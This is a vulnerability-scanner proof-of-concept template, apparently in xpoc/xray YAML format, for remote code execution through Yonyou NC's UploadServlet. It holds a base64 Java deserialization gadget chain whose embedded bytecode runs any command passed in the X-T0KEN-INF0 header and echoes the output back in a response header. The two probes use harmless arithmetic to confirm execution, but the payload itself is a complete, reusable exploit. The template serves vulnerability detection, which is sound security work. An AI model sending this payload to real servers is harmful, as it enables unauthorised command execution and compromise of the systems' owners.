id: yonyou-nc-uploadservlet-rce

info:
  name: Yonyou NC upload servlet rce
  author: xpoc
  severity: high
  verified: true
  reference:
    - https://mp.weixin.qq.com/s/xVKuJb3DbKH0em0HoMZ4ZQ
  tags: yonyou,rce
  created: 2023/06/23

set:
    rInt1: randomInt(800000000, 1000000000)
    rInt2: randomInt(800000000, 1000000000)
    result: base64(string(rInt1+rInt2))
    rb: base64Decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAAAc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAACc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyAClvcmcuYXBhY2hlLnhhbGFuLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAHSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4TAALX2F1eENsYXNzZXN0ACpMb3JnL2FwYWNoZS94YWxhbi94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABVMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////9wdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAADvHK/rq+AAAAMgDjCgADAA8HAN4HABIBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAQABQcAEwEAM3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAEGphdmEvbGFuZy9PYmplY3QBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABBqYXZhL2xhbmcvVGhyZWFkBwAVAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DAAXABgKABYAGQEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwwAGwAcCgAWAB0BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMAB8AIAoAAwAhAQAHdGhyZWFkcwgAIwEAD2phdmEvbGFuZy9DbGFzcwcAJQEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMACcAKAoAJgApAQAiamF2YS9sYW5nL3JlZmxlY3QvQWNjZXNzaWJsZU9iamVjdAcAKwEADXNldEFjY2Vzc2libGUBAAQoWilWDAAtAC4KACwALwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwAxAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMADMANAoAMgA1AQATW0xqYXZhL2xhbmcvVGhyZWFkOwcANwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAOQA6CgAWADsBAARleGVjCAA9AQAQamF2YS9sYW5nL1N0cmluZwcAPwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABBAEIKAEAAQwEABGh0dHAIAEUBAAZ0YXJnZXQIAEcBABJqYXZhL2xhbmcvUnVubmFibGUHAEkBAAZ0aGlzJDAIAEsBAAdoYW5kbGVyCABNAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwBPAQANZ2V0U3VwZXJjbGFzcwwAUQAgCgAmAFIBAAZnbG9iYWwIAFQBAApwcm9jZXNzb3JzCABWAQAOamF2YS91dGlsL0xpc3QHAFgBAARzaXplAQADKClJDABaAFsLAFkAXAEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwAMwBeCwBZAF8BAANyZXEIAGEBAAtnZXRSZXNwb25zZQgAYwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAGUAZgoAJgBnAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwBpAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABrAGwKAGoAbQEACWdldEhlYWRlcggAbwEADFgtVDBLRU4tSU5GMAgAcQEAB2lzRW1wdHkBAAMoKVoMAHMAdAoAQAB1AQAJc2V0U3RhdHVzCAB3AQARamF2YS9sYW5nL0ludGVnZXIHAHkBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMAHsAfAkAegB9AQAEKEkpVgwABAB/CgB6AIABAAdvcy5uYW1lCACCAQAQamF2YS9sYW5nL1N5c3RlbQcAhAEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAIYAhwoAhQCIAQALdG9Mb3dlckNhc2UMAIoAOgoAQACLAQAGd2luZG93CACNAQAHY21kLmV4ZQgAjwEAAi9jCACRAQAHL2Jpbi9zaAgAkwEAAi1jCACVAQARamF2YS91dGlsL1NjYW5uZXIHAJcBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHAJkBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAEAJsKAJoAnAEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DACeAJ8KAJoAoAEAEWphdmEvbGFuZy9Qcm9jZXNzBwCiAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwApAClCgCjAKYBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMAAQAqAoAmACpAQACXEEIAKsBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMAK0ArgoAmACvAQAEbmV4dAwAsQA6CgCYALIBAAhnZXRCeXRlcwEABCgpW0IMALQAtQoAQAC2AQAqb3JnLmFwYWNoZS50b21jYXQudXRpbC5jb2RlYy5iaW5hcnkuQmFzZTY0CAC4AQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMALoAuwoAJgC8AQAMZW5jb2RlQmFzZTY0CAC+AQACW0IHAMABAAlzZXRIZWFkZXIIAMIBAAdYLVQwS0VOCADEAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAEAMYKAEAAxwEABShbQilWDAAEAMkKAEAAygEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HAMwBABNqYXZhLm5pby5CeXRlQnVmZmVyCADOAQAEd3JhcAgA0AEAEWdldERlY2xhcmVkTWV0aG9kDADSAGYKACYA0wEAB2RvV3JpdGUIANUBABNq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")
rules:
    r0:
        request:
            method: POST
            path: /servlet/~ic/nc.document.pub.fileSystem.servlet.UploadServlet
            headers:
                Content-Type: multipart/form-data;
                X-T0KEN-INF0: set /A {{rInt1}}+{{rInt2}}
            body: '{{rb}}'
        expression: response.raw_header.ibcontains(b"X-T0KEN") && response.raw_header.bcontains(bytes(result))
    r1:
        request:
            method: POST
            path: /servlet/~ic/nc.document.pub.fileSystem.servlet.UploadServlet
            headers:
                Content-Type: multipart/form-data;
                X-T0KEN-INF0: expr {{rInt1}}+{{rInt2}}
            body: '{{rb}}'
        expression: response.raw_header.ibcontains(b"X-T0KEN") && response.raw_header.bcontains(bytes(result))
expression: r0() || r1()